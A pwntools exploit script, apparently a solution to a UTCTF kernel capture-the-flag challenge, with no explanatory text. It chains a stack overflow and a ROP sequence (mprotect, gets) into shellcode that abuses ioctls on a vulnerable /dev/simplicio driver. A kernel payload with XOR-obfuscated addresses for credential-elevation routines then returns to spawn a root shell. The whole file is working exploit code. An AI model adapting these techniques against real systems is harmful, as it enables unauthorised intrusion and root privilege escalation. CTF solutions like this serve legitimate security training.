from pwn import *

e = ELF("./fs/pwnable")

context.binary = e

if "--remote" in sys.argv:
  p = remote("kernel.utctf.live", 9051)
else:
  #p = process(e.path)
  p = process("./cmd.sh")

rdi = (0x4267a0)
sys_rbx = (0x0042431e)
rsi = (0x0049cc07)
rax = (0x0044ef17)
rdx_rbx = (0x004956e0)

buff = 0x00000000004cd000

p.sendlineafter("How old are you?", "-1")
p.sendlineafter("call?", "A")
p.sendlineafter("message:", "\x00" * 0x108 
  + p64(rdi) + p64(buff // 0x1000 * 0x1000)
  + p64(rsi) + p64(0x10000)
  + p64(rdx_rbx) + p64(0x7) + p64(0) 
  + p64(e.symbols["mprotect"])
  + p64(rdi) + p64(buff)
  + p64(e.symbols["gets"])
  + p64(buff)
)

ui.pause()

pay = ""

pay += (
  asm("""
    mov eax, 2
    mov rdi, 0x4cd500
    mov rsi, 2
    mov rdx, 0
    syscall
    mov r13, rax

    mov rdi, 0x1000
    mov rax, 0x424420
    call rax
  """) 
)

for i in range(8):
  if i == 5:
    continue
  pay += asm("""
    mov rax, 16 
    mov rdi, r13
    mov rsi, 0x200
    mov rdx, """ + hex(0x4cd520 + 0x20 * i) + """
    syscall
  """)

# sbrk
pay += asm("""
  mov rax, 12
  mov rdi, 0x700000
  syscall
  mov r12, rax
""")

# read + copy
pay += asm("""
  mov rsi, 0x670000
  mov rax, 0xffffffff8118018d
  mov [rsi], rax
  add rsi, 8
  mov rax, 0x4cd910
  mov [rsi], rax

  mov rax, 16 
  mov rdi, r13
  mov rsi, 0x200
  mov rdx, """ + hex(0x4cd800) + """
  syscall
""")


pay += asm(shellcraft.sh())

pay = pay.ljust(0x500, "\x00")
print(len(pay))
  
pay += "/dev/simplicio".ljust(0x20, "\x00") # 0x20

for i in range(8):
  pay += p64(0xffffffffa0002100 + 8 - 1 - i - 0x78 - 6) + p64(0) + p64(0) + p64(1) 

pay = pay.ljust(0x800, "\x00")

kbuff = 0xffffffffa0002100 + 0x10
ret_addr = 0xffffc90000077e70

# 0x800
pay += p64(ret_addr) + p64(0) + p64(0) + p64(0) 

pay = pay.ljust(0x910, "\x00")
pay += asm("""
  mov r8, 0x3030
  mov rdx, 0xffffffff810493c0 ^  0x979197
  xor rdx,  0x979197
  xor rdi, rdi
  call rdx
  mov rdi, rax

  mov rdx, 0xffffffff81049200 ^ 0x979797
  xor rdx, 0x979797
  call rdx

  xor rax, rax
  xor rdx, rdx

  sub rsp, 8
  mov [rsp], rdx
  sub rsp, 8
  mov rdx, 0xffffffff810d27b4 ^ 0x970000
  xor rdx, 0x970000
  mov [rsp], rdx


  ret
""")


print("\n" in pay or "\x0d" in pay)

p.sendline(pay)

p.interactive()
